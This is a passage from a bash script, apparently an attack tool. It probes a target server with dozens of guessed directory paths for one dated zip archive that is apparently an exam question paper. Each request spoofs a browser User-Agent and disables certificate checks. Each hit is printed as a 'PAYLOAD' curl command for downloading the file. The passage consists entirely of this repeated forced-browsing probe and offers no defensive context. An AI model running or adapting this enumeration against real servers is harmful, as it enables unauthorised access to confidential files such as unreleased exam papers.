${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Transfer-QPMgmt/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [ToolQPService/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}ToolQPService/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}ToolQPService/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QstnPaperTransfer/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QstnPaperTransfer/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QstnPaperTransfer/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [BatchUpload_QPWorkflow/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}BatchUpload_QPWorkflow/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}BatchUpload_QPWorkflow/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Ops-QP/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Ops-QP/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Ops-QP/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [DataSync_QPAuto/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}DataSync_QPAuto/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}DataSync_QPAuto/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Panel-TestPaper/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Panel-TestPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Panel-TestPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [CloudSync-QPCloud/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}CloudSync-QPCloud/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}CloudSync-QPCloud/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPUploader-Tool/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPUploader-Tool/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPUploader-Tool/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPDatabaseUploadService/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPDatabaseUploadService/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPDatabaseUploadService/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [ModuleQP/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}ModuleQP/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}ModuleQP/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [MonitoringToolQPHandler/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}MonitoringToolQPHandler/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}MonitoringToolQPHandler/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPUploader_DataOps/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPUploader_DataOps/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPUploader_DataOps/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [UploaderQPBFile/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}UploaderQPBFile/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}UploaderQPBFile/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Handling_QPManager/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Handling_QPManager/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Handling_QPManager/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Manager_QPAuto/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Manager_QPAuto/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Manager_QPAuto/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPAutoManager/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPAutoManager/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPAutoManager/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [ManagerQPHandler/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}ManagerQPHandler/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}ManagerQPHandler/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [HandlingModuleQstnPaper/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}HandlingModuleQstnPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}HandlingModuleQstnPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [DataPipelineQPMaster/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}DataPipelineQPMaster/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}DataPipelineQPMaster/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPMonitor-Ops/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPMonitor-Ops/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPMonitor-Ops/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [TestPaperBatchProcessor/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}TestPaperBatchProcessor/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}TestPaperBatchProcessor/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Processing_QuestionPaper/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Processing_QuestionPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Processing_QuestionPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [DataUpload-QPProcessing/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}DataUpload-QPProcessing/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}DataUpload-QPProcessing/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Mgmt_QPBFile/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Mgmt_QPBFile/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Mgmt_QPBFile/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Tool-QPProcessing/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Tool-QPProcessing/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Tool-QPProcessing/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Upload_QPDatabase/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Upload_QPDatabase/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Upload_QPDatabase/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Manager-QPSystem/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Manager-QPSystem/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Manager-QPSystem/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [ProcessingSystemQPControl/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}ProcessingSystemQPControl/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}ProcessingSystemQPControl/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [SuiteQPProcessing/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}SuiteQPProcessing/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}SuiteQPProcessing/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [TestPaperDatabaseManager/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}TestPaperDatabaseManager/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}TestPaperDatabaseManager/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Portal_QsnPaper/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Portal_QsnPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Portal_QsnPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [DashboardQPManager/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}DashboardQPManager/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}DashboardQPManager/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Control-QPProcessing/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Control-QPProcessing/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Control-QPProcessing/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [CloudSyncTestPaper/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}CloudSyncTestPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}CloudSyncTestPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [UploadServiceQPDatabase/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}UploadServiceQPDatabase/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}UploadServiceQPDatabase/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [MassUpload_QPAuto/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}MassUpload_QPAuto/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}MassUpload_QPAuto/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QsnPaper_Service/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QsnPaper_Service/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QsnPaper_Service/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPUploadPlatform/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPUploadPlatform/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPUploadPlatform/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [ProcessingSuite_QPSystem/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
